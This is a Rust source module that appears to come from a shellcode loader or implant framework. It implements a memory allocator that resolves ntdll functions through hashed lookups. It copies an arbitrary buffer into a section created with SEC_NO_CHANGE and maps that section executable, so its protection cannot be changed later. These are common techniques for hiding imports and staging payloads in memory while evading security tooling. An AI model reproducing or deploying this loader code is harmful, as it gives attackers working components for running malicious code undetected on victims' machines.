//! `NtCreateSection` + `SEC_NO_CHANGE`. Once mapped RX, the protection of
//! the view cannot be altered for the lifetime of the section.

use core::ffi::c_void;
use core::ptr;

use crate::hash::hash_str;
use crate::native::{get_export_by_hash, get_module_base_by_hash};
use crate::shared::{
    current_process, is_success, LargeInteger, NtClose, NtCreateSection, NtMapViewOfSection,
    NtUnmapViewOfSection, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
    SECTION_ALL_ACCESS, SECTION_NO_CHANGE, SEC_COMMIT, VIEW_SHARE,
};
use windows_sys::Win32::Foundation::HANDLE;

use super::{AllocatedRegion, Allocator};

pub struct Section;

impl Allocator for Section {
    fn allocate(buffer: &[u8]) -> Option<AllocatedRegion> {
        unsafe {
            let ntdll = get_module_base_by_hash(hash_str("ntdll.dll"));
            if ntdll.is_null() {
                return None;
            }
            let f_create = get_export_by_hash(ntdll, hash_str("NtCreateSection"));
            let f_map = get_export_by_hash(ntdll, hash_str("NtMapViewOfSection"));
            let f_unmap = get_export_by_hash(ntdll, hash_str("NtUnmapViewOfSection"));
            let f_close = get_export_by_hash(ntdll, hash_str("NtClose"));
            if f_create.is_null() || f_map.is_null() || f_unmap.is_null() || f_close.is_null() {
                return None;
            }
            let nt_create: NtCreateSection = core::mem::transmute(f_create);
            let nt_map: NtMapViewOfSection = core::mem::transmute(f_map);
            let nt_unmap: NtUnmapViewOfSection = core::mem::transmute(f_unmap);
            let nt_close: NtClose = core::mem::transmute(f_close);

            let mut handle: HANDLE = 0 as HANDLE;
            let mut size: LargeInteger = buffer.len() as LargeInteger;
            let status = nt_create(
                &mut handle,
                SECTION_ALL_ACCESS,
                ptr::null_mut(),
                &mut size,
                PAGE_EXECUTE_READWRITE,
                SEC_COMMIT | SECTION_NO_CHANGE,
                0 as HANDLE,
            );
            if !is_success(status) {
                return None;
            }

            let mut temp: *mut c_void = ptr::null_mut();
            let mut view_size: usize = buffer.len();
            let status = nt_map(
                handle,
                current_process(),
                &mut temp,
                0,
                0,
                ptr::null_mut(),
                &mut view_size,
                VIEW_SHARE,
                0,
                PAGE_READWRITE,
            );
            if !is_success(status) {
                nt_close(handle);
                return None;
            }
            core::ptr::copy_nonoverlapping(buffer.as_ptr(), temp as *mut u8, buffer.len());
            nt_unmap(current_process(), temp);

            let mut region: *mut c_void = ptr::null_mut();
            view_size = buffer.len();
            let status = nt_map(
                handle,
                current_process(),
                &mut region,
                0,
                0,
                ptr::null_mut(),
                &mut view_size,
                VIEW_SHARE,
                0,
                PAGE_EXECUTE_READ,
            );
            nt_close(handle);
            if !is_success(status) || region.is_null() {
                return None;
            }
            Some(AllocatedRegion { region, aux: 0 })
        }
    }

    fn release(r: AllocatedRegion) {
        if r.region.is_null() {
            return;
        }
        unsafe {
            let ntdll = get_module_base_by_hash(hash_str("ntdll.dll"));
            if ntdll.is_null() {
                return;
            }
            let f_unmap = get_export_by_hash(ntdll, hash_str("NtUnmapViewOfSection"));
            if !f_unmap.is_null() {
                let nt_unmap: NtUnmapViewOfSection = core::mem::transmute(f_unmap);
                nt_unmap(current_process(), r.region);
            }
        }
    }
}
